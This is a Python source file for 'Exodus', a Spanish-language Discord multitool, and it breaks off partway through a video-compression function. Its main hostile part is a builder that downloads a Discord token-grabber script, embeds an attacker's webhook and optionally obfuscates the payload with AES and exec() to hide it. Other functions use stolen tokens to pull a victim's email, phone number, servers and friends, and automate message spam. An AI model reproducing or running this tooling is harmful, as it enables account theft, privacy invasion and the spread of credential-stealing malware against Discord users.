import time
import httpx
from json import load
from sys import stdout
from time import sleep
from Crypto import Random
from random import randint
from base64 import b64encode
from Crypto.Cipher import AES
from tkinter import filedialog
from webbrowser import open_new
from pypresence import Presence
from requests import get, post, delete
from pyautogui import typewrite, press
from os import getenv, system, remove, makedirs, path, name as _name, _exit
from httpx import NetworkError, TimeoutException
from ctypes import c_int, c_byte, Structure, byref, windll

client_id = '1042130801715855402'
RPC = Presence(client_id) 
RPC.connect()
RPC.update(details="Discord MultiTool", large_image="exodus", large_text="Develop zEncrypte", buttons=[{"label": "Github", "url": "https://github.com/zSpoof/Exodus"}, {"label": "Discord", "url": "https://discord.gg/vERHDPu6yz"}] ,start=time.time())

class _CI(Structure):
    _fields_ = [("size", c_int), ("visible", c_byte)]

def V12(color: list, text: str, speed: int = 1, start: int = 0, stop: int = 0, cut: int = 0, fill: bool = False) -> str: # <- pystyle
    color = color[cut:]
    lines = text.splitlines()
    result = ""
    nstart = 0
    color_n = 0
    for lin in lines:
        colorR = color[color_n]
        if fill:
            result += " " * \
                rise(lin) + "".join(toy(colorR, x) for x in lin.strip()) + "\n"
        else:
            result += " " * \
                rise(lin) + toy(colorR, lin.strip()) + "\n"  
        if nstart != start:
            nstart += 1
            continue
        if lin.rstrip():
            if (stop == 0 and color_n + speed < len(color) or stop != 0 and color_n + speed < stop):
                color_n += speed
            elif stop == 0:
                color_n = 0
            else:
                color_n = stop
    return result.rstrip()

def C12(col1: str, col2: str, KB: bool = True) -> list:
    col1, col2 = zero(col=col1), zero(col=col2)
    fade1 = DoubleColor([col1, col2], H8=False)      
    fade2 = DoubleColor([fade1, col2], H8=False)
    fade3 = DoubleColor([fade1, col1], H8=False)
    fade4 = DoubleColor([fade2, col2], H8=False)
    fade5 = DoubleColor([fade1, fade3], H8=False)    
    fade6 = DoubleColor([fade3, col1], H8=False)
    fade7 = DoubleColor([fade1, fade2], H8=False)
    mixed = [col1, fade6, fade3, fade5, fade1, fade7, fade2, fade4, col2]
    return KB(colors=mixed) if KB else mixed 

def TripleColor(colors: list):
    _colors = []
    for color in colors:
        if colors.index(color) == len(colors) - 1:
            break
        _colors.append([color, colors[colors.index(color) + 1]])
    colors = [C12(col1=color[0], col2=color[1], KB=False) for color in _colors]
    final = []
    for col in colors:
        for col in col:
            final.append(col)
    return KB(colors=final)

def DoubleColor(colors: list, H8: bool = False) -> str:
    rgb = []
    for col in colors:
        col = zero(col=col)
        col = col.split(';')
        r = int(int(col[0]))
        g = int(int(col[1]))
        b = int(int(col[2]))
        rgb.append([r, g, b])
    r = round(sum(rgb[0] for rgb in rgb) / len(rgb))
    g = round(sum(rgb[1] for rgb in rgb) / len(rgb))
    b = round(sum(rgb[2] for rgb in rgb) / len(rgb))
    rgb = f'{r};{g};{b}'
    return H8(rgb) if H8 else rgb

def slow(a):
    for aea in a:
        stdout.write(aea)
        stdout.flush()
        sleep(0.09)

def KB(colors: list) -> list:
    _colors = list(colors)
    for col in reversed(_colors):
        colors.append(col)
    return colors

def StatusConnection():
    if _name == 'nt':
        try:
            httpx.get('https://google.com')
        except (NetworkError, TimeoutException):
            _exit(1)
    else:
        _exit(1)

def H8(c: str) -> str:
    return f"\033[38;2;{c}m"

def toy(col: str, text: str) -> str:
    return f"\033[38;2;{col}m{text}\033[38;2;255;255;255m"

def zero(col: str) -> str:
    return col.replace('\033[38;2;', '').replace('m','').replace('50m', '').replace('\x1b[38', '')

def T1(title: str):
    if Win:
        return system(f"title {title}")

def cls():
    return system("cls" if Win else "clear")

def rise(text: str) -> int:
    return len(text) - len(text.lstrip())

def ex():
    if _name == 'nt':
        _s(False)

def _s(visible: bool):
    ci = _CI()
    handle = windll.kernel32.GetStdHandle(-11)
    windll.kernel32.GetConsoleCursorInfo(handle, byref(ci))
    ci.visible = visible
    windll.kernel32.SetConsoleCursorInfo(handle, byref(ci))

def check_webhook(hook):
    msg = '"Unknown Webhook"'
    info = t(hook).text
    if msg in info or 'discord.com/api/webhooks' not in hook:
        p()
        p(f" {m}[{r}!{m}]{w} Webhook Invalida")
        i(f" {m}[{r}!{m}]{w} Presiona enter para continuar")
        cls()
        BDTG()

def DiscordInvite():
    T1("Exodus")
    p(f"{m}[{r}*{m}] {g}Ingresando al servidor de discord..")
    s(3)
    url = "https://discord.gg/vERHDPu6yz"
    n(url)

Win = _name == 'nt'
All = __name__ == '__main__'
OX = getenv('COMPUTERNAME')
vo = H8('102;0;51') # violeta oscuro
m = H8('161;42;252') # morado
mc = H8('255;0;102') # morado claro
w = H8('255;255;255') # blanco
r = H8('255;0;0') # rojo
g = H8('0;255;119') # verde claro
M1 = DoubleColor((vo, mc))
o = post
i = input
p = print
s = sleep
t = get
d = delete
n = open_new
ex()

def MSN():
    T1(f"Exodus ^| Minecraft Search Nick")
    cls()
    B2 = fr"""
    ██████   ██████  █████████  ██████   █████
    ░░██████ ██████  ███░░░░░███░░██████ ░░███ 
     ░███░█████░███ ░███    ░░░  ░███░███ ░███ 
     ░███░░███ ░███ ░░█████████  ░███░░███░███ 
     ░███ ░░░  ░███  ░░░░░░░░███ ░███ ░░██████ 
     ░███      ░███  ███    ░███ ░███  ░░█████ 
     █████     █████░░█████████  █████  ░░█████
    ░░░░░     ░░░░░  ░░░░░░░░░  ░░░░░    ░░░░░ 
                                            """[1:]
    p(V12(TripleColor((M1, m)), (B2)))
    nick = i(f" {m}[{r}*{m}] Introduce el Nick {r}> {w}")
    rq = t(f"https://api.mojang.com/users/profiles/minecraft/{nick}")
    status = rq.status_code
    if status == 200:
        p(f" {m}[{r}*{m}] {w}Este usuario es premium.")
        i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")
        cls()
    elif status == 204:
        p(f" {m}[{r}*{m}] {g}Usuario disponible.")
        i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")
        cls()

def DTI():
    T1(f"Exodus ^| Discord Token Info")
    cls()
    X3 = fr"""
         ______     __              ____     ___   
        /_  __/__  / /_____ ___    /  _/__  / _/__ 
         / / / _ \/  '_/ -_) _ \  _/ // _ \/ _/ _ \
        /_/  \___/_/\_\\__/_//_/ /___/_//_/_/ \___/
                                           
    """[1:]
    p(V12(TripleColor((M1, m)), (X3)))
    token = i(f" {m}[{r}*{m}] Ingresa el token del usuario {r}> {w}")
    p(f" {m}[{r}*{m}] {w}Obteniendo información..")
    s(.5)
    us = t("https://discord.com/api/users/@me", headers = {'Authorization' : token})
    if us.status_code == 401:
        p(f" {m}[{r}!{m}]{w} Token Invalido")
        return
    srvs = t("https://discord.com/api/users/@me/guilds", headers = {'Authorization' : token}).json()
    friends = t("https://discord.com/api/v10/users/@me/relationships", headers = {'Authorization' : token}).json()
    us = us.json()
    p(f" {m}[{r}+{m}] {g}Token valido !\n")
    X9 = f"""
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  Usuario: {us['username']}#{us['discriminator']}
  Telefono: {us['phone']}
  ID: {us['id']}
  Correo: {us['email']}
  2fA: {us['mfa_enabled']}
  Lenguaje: {us['locale']}
  Servidores: {len(srvs)}
  Amigos: {len([i for i in friends if i['type'] == 1])}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
    """[1:]
    p(V12(TripleColor((M1, m)), (X9)))
    i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")

def BDTG():
    T1(f"Exodus  ^|  Builder Discord Token Grabber")
    cls()
    K2 = fr"""
            ____        _ __    __   ______           __    __             
           / __ )__  __(_) /___/ /  / ____/________ _/ /_  / /_  ___  _____
          / __  / / / / / / __  /  / / __/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
         / /_/ / /_/ / / / /_/ /  / /_/ / /  / /_/ / /_/ / /_/ /  __/ /    
        /_____/\__,_/_/_/\__,_/   \____/_/   \__,_/_.___/_.___/\___/_/     
                                                                   
    """[1:]
    p(V12(TripleColor((M1, m)), (K2)))
    webhook = i(f" {m}[{r}*{m}] Ingresa la Webhook {r}> {w}")
    if not check_webhook(webhook): 
        fn = i(f" {m}[{r}*{m}] Nombre del Archivo {r}> {w}")
    code = t("https://raw.githubusercontent.com/zSpoof/Luna-Token-Grabber/main/luna.py").text.replace("%webhook_here%", webhook)
    with open(f"{fn}.py", 'w', errors="ignore") as f:
        f.write(code)
    obf = i(f" {m}[{r}*{m}] Deseas obfuscar el archivo? {w}[y/n]: {r}> {w}")
    if obf.lower() == 'y' or obf.lower() == 'yes' or obf.upper() == 'Y' or obf.upper() == 'YES' or obf.lower() == 's' or obf.lower() == 'si' or obf.upper() == 'S' or obf.upper() == 'SI':
        IV = Random.new().read(AES.block_size)
        key = u''
        for I in range(8):
            key = key + chr(randint(0x4E00, 0x9FA5))
        with open(f'{fn}.py') as f:
            _file = f.read()
            imports = ''
            ifile = _file.splitlines()
            for I in ifile:
                if I.startswith("import") or I.startswith("from"):
                    imports += I+';'
        with open(f'{fn}.py', "wb") as f:
            EBytes = b64encode(_file.encode())
            OBFBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(EBytes)
            f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({OBFBytes})).decode())'.encode())
            f.close()
    i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")

def AnySpam():
    T1(f"Exodus  ^|  AnySpam")
    cls()
    N1 = fr"""
⠈⢙⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⣠⡞⣻⣃⣠⡤⠤⠒⠒⠛⠁⣼⠀⠀⠀⠀⠀⠀⠀⣼⡛⠓⠒⠦⢤⣄⡀⠀⠀⠀⠈⢻⣝⠳⣽⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀
⢠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⡿⠛⣹⠋⠀⠀⠀⠀⠀⠀⣠⠞⡇⠀⠀⠀⠀⠀⠀⣼⠉⢧⠀⠀⠀⠀⠀⠈⠉⠙⠲⠦⣄⠹⣆⠀⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀
⡏⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⢋⣿⠏⢀⡴⠁⠀⠀⠀⠀⠀⣹⡾⠋⠀⡇⠀⠀⠀⠀⠀⣸⠃⠀⠈⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣿⣧⡀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⠀
⠀⠀⠀⠀⢀⣀⣤⠴⠻⣉⠀⠀⠚⠁⣠⠞⢁⣀⣀⣤⣤⣤⠾⠽⡀⠀⠀⢹⠀⠀⠀⠀⢠⠇⠀⠀⣠⡋⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡿⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡖⠒⠒⠋⠉⠁⠸⣦⣄⣙⣳⣦⣤⣴⣷⣾⣿⣿⣿⣿⣿⣿⣶⣤⠞⠀⠀⢸⡀⠀⠀⢰⣿⠀⠀⠺⣏⣤⣤⣽⣿⣿⣶⣶⣤⣀⡀⠀⠀⠀⢳⡀⠙⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠙⠒⠒⣦⣤⠤⢤⣽⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⠟⠛⠻⣿⣇⠀⠀⠀⣇⠀⠀⢸⠇⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣤⣧⡤⠚⠉⢙⣻⡶⠶⣤⣄⠀⡤⠀⠀
⠀⣠⠞⣽⠁⣀⣀⣴⣾⣿⣿⣿⣿⠟⠉⠀⠀⠘⢯⠉⢷⣄⣴⡿⠏⠁⠀⠀⢸⡄⠀⢸⠀⠀⠘⡿⣿⡀⠀⢀⡿⢿⣿⠿⣯⡛⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠀⠀⠹⣷⣄⠀⡀
⣰⠃⣸⠁⠀⠀⠀⠀⠀⠘⠻⣿⣿⠀⠀⠀⠀⠀⠀⠙⠒⠚⠉⠀⠀⠀⠀⠀⠀⢳⠀⢸⠀⠀⠀⠃⠹⣿⣲⣛⣳⠾⠁⠀⠈⠙⢶⣄⠈⣿⣿⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠙⠷⣿                
⠃⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⠂⢀⡠⢤⣶⣾⠿⠛⠻⠃⠀⠀⠀⠀⠀⠀⠀⢧⢸⡄⠀⠐⠤⠤⢤⣤⣍⣀⡀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡿⠁⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⡟     
⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠘⠁⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠈⢳⣷⠀⠀⠀⠀⠈⠉⠉⠙⢿⢿⡖⠦⢤⣀⣀⠘⢫⠇⠉⠓⠦⣄⡀⠻⣤⡀⠀⠀⠀⠀⠀⡇   
⠀⡇⠀⠀⠀⠀⠀⠀⠀⣰⠁⠀⣴⣶⣶⡄⠀⠀⠀⠀⠀⢿⡏⠉⠲⠖⠒⠒⠒⢶⠄⠀⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣩⣤⡀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠉⠓⠦⣽⣦⡀⠀⠀⣸⠀   
⢠⣇⠀⠀⠀⠀⠀⠀⣰⡏⠀⣤⣿⡙⣿⣷⠄⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⣠⡶⠟⠀⠀⠀⠙⣦⠀⠀⠀⠀⠀⠀⢀⣘⣿⢿⣟⡀⠀⣰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⢠⠇⠀  
⠘⣿⡀⠀⠀⠀⠀⢀⣿⡷⠀⠙⡟⠁⠈⠉⠀⠀⠀⠀⠀⠀⠀⠈⠓⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠋⠸⠿⠟⣠⠏⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠎⠀⠀   ___                _____              
⠀⠸⣇⠀⠀⠀⠀⢸⢸⡇⠀⠿⠷⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠃⠀⣠⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠀⠀⠀  /   |  ____  __  __/ ___/____  ____ _____ ___  
⠀⠀⢹⡄⠀⠀⠀⡏⠀⢇⠀⠀⠀⠀⠀⠀⠀⠈⠳⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⣠⣞⣫⣤⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠋⠀⠀⠀⠀ / /| | / __ \/ / / /\__ \/ __ \/ __ `/ __ `__ \
⠀⠀⠀⢻⡄⠀⠀⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡿⣿⣿⣷⣶⣦⣤⣤⣤⣀⣠⣴⣶⣾⠏⠀⠀⠀⠀⠀⠈⢉⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀  / ___ |/ / / / /_/ /___/ / /_/ / /_/ / / / / / /
⠀⠀⠀⠀⢻⡄⠀⢻⠀⠀⢳⡄⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⡰⠋⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢀⡤⠞⠁⠀⠀⠀   /_/  |_/_/ /_/\__, //____/ .___/\__,_/_/ /_/ /_/ 
⠀⠀⠀⢀⡾⠙⣆⠘⡆⠀⡀⠹⡄⠀⠀⠀⠀⠀⠀⢠⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⠐⠀⠀⣀⡴⣚⣡⠴⠚⠉⠀⠀⠀⠀⠀⠀                 /____/    /_/
⠀⠀⣠⠞⠁⠀⠈⠳⣽⡞⠀⠀⢙⣦⡀⠀⠀⠀⠀⠈⢧⣿⣿⣿⡟⣻⣿⣿⣿⣿⣿⠟⣫⠞⠁⠀⠀⠀⢀⣀⡏⠀⠀⠀⠀⢀⡤⠞⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰        
⣤⠞⠁⠀⠀⠀⠀⣰⠏⠳⣄⡔⠋⠀⠛⣦⡀⠀⠀⠀⠈⣿⣿⣟⣰⣿⣿⣿⣿⣿⡵⠚⠁⠀⢀⣠⠔⠒⠈⡿⠀⠀⠀⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃          
⠁⠀⠀⠀⣀⡤⣾⠏⠀⡴⠋⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠘⣿⣿⣉⣠⣿⣿⠏⠀⠀⠀⠀⡰⠋⠀⠀⠀⢰⡇⠀⢀⡼⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀
⠛⠛⠋⢉⡏⠠⡟⠀⡞⠁⠀⠀⠀⠀⠀⠀⠀⢀⣻⡳⢤⣀⠈⠉⠋⠉⠿⠃⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣾⡇⢠⠟⣹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡤⠖⣋⡀⠀⠀
⠀⠀⢀⡿⡼⠀⡇⡸⠀⠀⠀⠀⠀⢀⡤⠖⠛⠉⠀⠀⠀⠉⠓⠦⣄⣀⠠⠄⠀⣀⣀⣠⠤⠴⠚⠋⣡⠞⠁⣧⡟⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠖⠛⠉⠁⠀⠀⠀⠀⢀⣀⠉⠓
⠀⠀⢸⢣⠃⠀⣷⠇⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠈⠒⢦⣀⠀⠀⠀⠉⠉⢿⡉⠉⠁⠀⠀⠀⢠⡾⠃⠀⠀⠻⠇⡿⠀⠀⠀⠀⠀⠀⢀⣤⠞⠉⠀⠀⡀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
⠀⠀⢸⠀⠀⠀⢿⠀⠀⠀⡼⠋⠐⠂⣠⣤⣄⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⡴⠋⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⣴⠟⠁⠀⠀⠀⠙⠟⠀⠀⠀⠀⠀⠰⣶⡆⠀⠀
⠀⠀⢘⠀⠀⠀⢸⠀⠀⢸⠱⣶⠆⠠⣾⠿⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⡄⠀⣾⠁⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠗⠀⠀⠀⠀⡀⠀
⠀⠀⠈⡀⠀⠀⢸⡆⢠⡟⢀⣤⣄⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⠄⠀⠀⠀⠋⣭⠀
⠀⠀⠀⠑⠀⠀⠀⢧⢸⠁⠈⠛⣯⣄⣛⡛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀
    """[1:]
    p(V12(TripleColor((M1, m)), (N1)))
    K1 = i(f" {m}[{r}*{m}] Introduce el mensaje a spamear {r}> {w}")
    cls()
    p(V12(TripleColor((M1, m)), (N1)))
    K4 = i(f" {m}[{r}*{m}] Introduce la cantidad de mensajes a enviar {r}> {w}")
    p(V12(TripleColor((M1, m)), (N1)))
    delay = i(f" {m}[{r}*{m}] Introduce el delay por cada mensaje {r}> {w}")
    s(10)
    for I in range(int(K4)):
        counter = 0
        s(float(delay))
        counter += 1
        K2 = randint(1, 999)
        K3 = randint(1, 999)
        delay = float(delay)
        typewrite(str(f"[{K2}] {K1} [{K3}]"))
        press('enter')
    i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")

def XCSS():
    T1("Exodus  ^|  Video Compress")
    cls()
    O5 = r"""
⠀⠀⢠⡶⠶⣒⡦⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⡾⠿⠉⣭⡈⣷⡄⠀
⠀⠀⢸⣦⡶⠛⠛⠛⠓⠻⢿⣗⠲⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣿⣿⣿⠿⠚⠋⠉⠙⣧⢸⣷⠀
⠀⠀⣼⣿⠃⠀⠀⠀⠀⠀⠀⠈⠙⠶⢼⣛⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⢸⣤⣿⡆
⠀⠀⡿⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠋⠇⡇
⠀⠀⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⠿⠿⠭⠙⣻⣷⣶⣶⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢸⡇
⠀⠀⣇⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣸⠁
⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣴⡟⠀
⠀⠀⠘⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡇⠀
⠀⠀⠀⢨⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣟⡿⠃⠀
⠀⠀⠀⡾⢹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠶⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠻⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠀⠀⠀  __  _____                              
⠀⠀⢰⠇⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⡶⠒⠲⣄⠀⠀⠀⠀⠀⠀⢀⣠⢤⣴⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀  \ \/ / __|___ _ __  _ __ _ _ ___ ______
⠀⠀⡾⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢿⣿⣿⣇⠀⢀⣾⣆⠀⠀⠀⠀⢀⡏⠀⢀⣽⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣧⠀⠀   >  < (__/ _ \ '  \| '_ \ '_/ -_|_-<_-<
⠀⢰⠳⠇⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠘⣿⣧⣽⣿⣿⣿⣿⡆⠀⠀⠀⢸⣿⣿⣿⣅⣼⣿⠏⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡽⡆⠀  /_/\_\___\___/_|_|_| .__/_| \___/__/__/
⠀⢸⢸⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠈⠻⠿⠿⠿⣻⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⠿⠋⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⣷⠀                      |_|                 
⠀⡟⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣀⣀⣀⡠⢔⣾⣿⠟⠀⠀⠀⠀⠈⢿⣦⣀⠀⠀⠀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠀
⠀⡇⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠷⠶⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠶⠟⠁⠀⠀⠀⠀⠀⠀⣀⣤⣄⠀⠀⢸⣿⡇
⠰⡇⠸⡄⠀⠀⠛⢿⣷⡦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⣾⣿⣿⡿⠀⠀⣿⣿⡇
⠈⣿⣆⠙⣦⡀⠀⠀⠙⢿⣦⣍⣳⢶⣤⣀⡀⠀⠀⠀⡀⣠⡄⠀⣀⠀⠀⠀⠀⠀⠀⢀⣀⣠⠤⠖⢛⣩⣾⠟⠁⠀⠀⠀⣠⠏⣿⡇
⠀⠈⠹⢿⣟⢿⣶⣄⡀⠀⠉⠻⢿⣽⣛⠿⢿⣿⣿⣛⣿⣟⠛⠺⠋⣤⣤⣶⠶⠾⠟⣉⣁⣤⣴⣾⡿⠟⠁⠀⠀⠀⣠⣾⣋⣾⠟⠀
⠀⠀⠀⠀⠙⠻⢿⣥⣉⠓⠦⣄⣀⠈⣩⣿⣷⠀⠈⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⣹⣿⠟⠛⠉⠀⠀⢀⣠⣴⣾⣫⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣭⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣶⣶⣶⣶⣾⣻⡽⠾⠛⠁⠀⠀⠀⠀⠀
    """[1:]
    p(V12(TripleColor((M1, m)), (O5)))
    i(f" {m}[{r}+{m}] {w}Presiona enter para buscar el archivo multimedia... ")
    script_folder = path.dirname(path.abspath(__file__)) + "\\"
    if not path.exists(f"{script_folder}Compress"):
        makedirs(f"{script_folder}Compress")
    cls()
    p(V12(TripleColor((M1, m)), (O5)))
    input_video = filedialog.askopenfilename().replace("/", "\\")
    output_video = path.basename(input_video)
    output_video = ".".join(output_video.split(".")[:-1])
    p(w)
    system(f"ffprobe -hide_banner -loglevel warning -of json -select_streams v -show_format -show_streams -i \"{input_video}\" -o \"temp.json\"")
    with open("temp.json", "r") as openfile:
        video_data = load(openfile)
    duration = float(video_data["format"]["duration"])
    width = int(video_data["streams"][0]["width"])
    height = int(video_data["streams"][0]["height"])
    bitrate = 65536 / duration
    p(w)
    if width > height:
        if duration < 31:
            bitrate -= 128
            if height >= 1080:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=-1:1080 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=-1:1080 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 128k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 128k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 61:
            bitrate -= 96
            if height >= 720:
